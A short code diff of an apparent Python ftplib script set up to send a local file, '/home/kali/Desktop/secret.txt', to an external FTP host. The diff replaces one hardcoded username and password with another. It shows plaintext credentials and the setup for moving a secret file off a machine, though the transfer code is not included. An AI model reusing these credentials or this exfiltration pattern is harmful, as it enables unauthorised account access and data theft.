@@ -1,9 +1,10 @@
+import os
 import ftplib
 
 # Set the FTP server address and credentials
 ftp_server = 'eu-central-1.sftpcloud.io'
-ftp_username = '09021bbea77c41cba30b335dedd4e2cb'
-ftp_password = 'nM0CfvfJ4VY6kJMnNmUuWhCrnamUAbYo'
+ftp_username = '389c3560fe77494785399550b042bbc6'
+ftp_password = '2xHYbjpEGH2V3CQl2mwj32YHjldkkBod'
 ftp_port = 21
 file_path_to_send = '/home/kali/Desktop/secret.txt'
 
